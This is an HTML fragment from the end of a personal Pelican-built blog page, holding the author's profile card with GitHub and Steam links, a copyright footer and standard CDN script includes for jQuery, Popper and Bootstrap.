</a> <div class=flex-grow-1></div> <div class="text-muted text-right neighbour-item d-flex align-items-center"> <div> <div class=neighbour>下一篇</div> <div>无</div> </div> <svg class="icon icon-neighbour icon-next ml-3"><use xlink:href=#icon-next></use></svg> </div> </div> </article> </div> <div class="col-md col-12 pl-md-0 pr-lg-0"> <div class="border-0 card text-center" id=profile-card> <img alt=Avatar class="rounded-circle img-thumbnail mx-auto mb-2" id=avatar src=https://shniubobo.xyz/static/avatar.jpg> <div class=mb-1 id=name>shniubobo</div> <p class="mb-2 d-block d-md-none d-lg-block">仍未停止思考</p> <div class="container col-xl-8 col-md-12 col-sm-4 col-6"> <div class="row row-cols-2 mb-0 pl-0"> <div class="col px-0"><a class="d-inline-block social-icon" href=https://github.com/shniubobo rel=noreferrer target=_blank><svg class=icon><use xlink:href=#icon-github></use></svg></a></div> <div class="col px-0"><a class="d-inline-block social-icon" href=https://steamcommunity.com/id/shniubobo/ rel=noreferrer target=_blank><svg class=icon><use xlink:href=#icon-steam></use></svg></a></div> </div> </div> </div> </div> </div> </div> <footer class=mt-auto lang=en> <div class="container-lg container-fluid col-xxl-6 my-3 px-lg-0 d-md-flex text-muted text-md-left text-center"> <div class=flex-grow-1>Copyright © 2020 shniubobo</div> <div> <span class="d-block d-sm-inline">Powered by <a class=link-text href=https://github.com/getpelican/pelican rel=noreferrer target=_blank>Pelican</a></span><span class="dot d-none d-sm-inline"></span><span>Made by <a class=link-text href=https://shniubobo.xyz/about.html>shniubobo</a> with <span class=coffee></span></span> </div> </div> </footer> <script crossorigin=anonymous src=//at.alicdn.com/t/font_2112932_q7g9e3n630l.js></script> <script crossorigin=anonymous integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" src=https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js></script> <script crossorigin=anonymous integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js></script> <script crossorigin=anonymous integrity="sha256-ecWZ3XYM7AwWIaGvSdmipJ2l1F4bN9RXW6zgpeAiZYI=" src=https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.min.js></script> 
